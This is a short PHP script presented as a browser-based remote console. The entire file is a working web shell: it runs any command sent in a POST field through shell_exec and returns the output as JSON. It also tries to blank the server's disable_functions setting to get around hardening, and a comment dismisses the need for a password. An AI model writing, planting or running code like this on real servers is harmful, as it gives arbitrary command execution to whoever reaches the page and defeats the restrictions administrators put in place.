<?php
/*REMOTE CONSOLE VIA WEB BROWSER*/

/**
 * This script not designed for long-time storage on server, just one time service and delete.
 * So in general there is no need any password check.
 */

session_start();

require('auth.php');
require('CoreUtils.php');

function directorySwitch($queryString)
{
	//look in current query for directory changes
	if (preg_match_all('/(^|\s)cd\s(\S+)(\s|$)/', $queryString, $matches))
	{
		$_SESSION['workingDirectory'] = end($matches[2]);
	}

    //look in session for working directory
    if ($_SESSION['workingDirectory'])
    {
        chdir($_SESSION['workingDirectory']);
    }
}

/**
 * @noinspection MissingOrEmptyGroupStatementInspection
 */
function allowShellExec ()
{
	if (strpos(ini_get('disable_functions'), 'shell_exec') === false) return true;
    if (ini_set('disable_functions','')) return true;
	return false;
}

/**
 * @TODO Not Implemented
 *
 * @param $cmd
 *
 * @return string
 */
function fake_shell_exec($cmd) {
    return 'shell_exec() is not allowed on this server';
}

function processRequest()
{
    //checking for existing and non-empty request
    if (!isset($_POST['query']) || $_POST['query'] === '')
    {
        require('terminal.html');
        return;
    }

    directorySwitch($_POST['query']);
    $shellExecAllowed = allowShellExec();

    $output = array(
        'currentUser' => $shellExecAllowed ? trim(shell_exec('whoami')) : CoreUtils::whoami(),
        'hostName' => php_uname('n'),
        'currentDirectory' => getcwd(),
        'commandOutput' => $shellExecAllowed ? trim(shell_exec($_POST['query'])) :  trim(fake_shell_exec($_POST['query']))
    );

    $output = json_encode($output);

    echo $output;
}

processRequest();
